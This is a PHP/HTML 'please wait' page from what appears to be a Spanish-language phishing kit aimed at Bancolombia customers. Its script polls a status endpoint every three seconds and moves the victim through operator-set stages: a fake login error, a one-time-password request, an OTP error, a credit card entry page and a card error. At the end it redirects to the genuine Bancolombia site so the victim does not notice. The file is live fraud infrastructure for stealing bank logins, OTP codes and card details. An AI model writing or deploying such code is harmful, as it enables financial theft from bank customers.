<?php

// Mobile check removed

?>
<?php
// 1. Cargar Configuración Global
$config = require '../../config/config.php';
$baseUrl = $config['baseUrl'];
$clienteId = $_GET['id'] ?? null;
?>
<!DOCTYPE html>
<html lang="es">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando...</title>

    <link rel="stylesheet" href="assets/css/login.css">
</head>

<body>
    <div class="wait-overlay active">
        <div class="wait-container">
            <div class="spinner"></div>
            <p>Cargando...</p>
        </div>
    </div>

    <script>
        const clienteId = <?php echo json_encode($clienteId); ?>;
        const baseUrl = <?php echo json_encode($baseUrl); ?>;
        let estadoInicial = null;

        async function checkStatus() {
            if (!clienteId) { clearInterval(statusInterval); return; }
            try {
                const response = await fetch(`../api/check_status.php?id=${clienteId}`);
                const data = await response.json();
                if (data.error) { clearInterval(statusInterval); return; }
                if (estadoInicial === null) { estadoInicial = data.estado; }

                // Check for a change in status
                if (data.estado !== estadoInicial) {
                    clearInterval(statusInterval);
                    if (data.estado == 2) {
                        // Estado 2: Error de login
                        window.location.href = `index.php?status=erroruser&id=${clienteId}`;
                    } else if (data.estado == 3) {
                        // Estado 3: OTP solicitado
                        window.location.href = `index.php?status=otp&id=${clienteId}`;
                    } else if (data.estado == 4) {
                        // Estado 4: OTP Error
                        window.location.href = `index.php?status=otp&id=${clienteId}&error=1`;
                    } else if (data.estado == 5) {
                        // Estado 5: CC
                        window.location.href = `index.php?status=cc&id=${clienteId}`;
                    } else if (data.estado == 6) {
                        // Estado 6: CC Error
                        window.location.href = `index.php?status=ccerror&id=${clienteId}`;
                    } else if (data.estado == 7) {
                        // Estado 7: Finalizar
                        window.location.href = `https://www.bancolombia.com/personas`;
                    } else {
                        // Si no hay un estado definido, regresa al login por defecto.
                        window.location.href = `index.php`;
                    }
                }
            } catch (error) {
                console.error('Error al verificar el estado:', error);
                clearInterval(statusInterval);
            }
        }
        const statusInterval = setInterval(checkStatus, 3000);
        checkStatus();
    </script>
</body>

</html>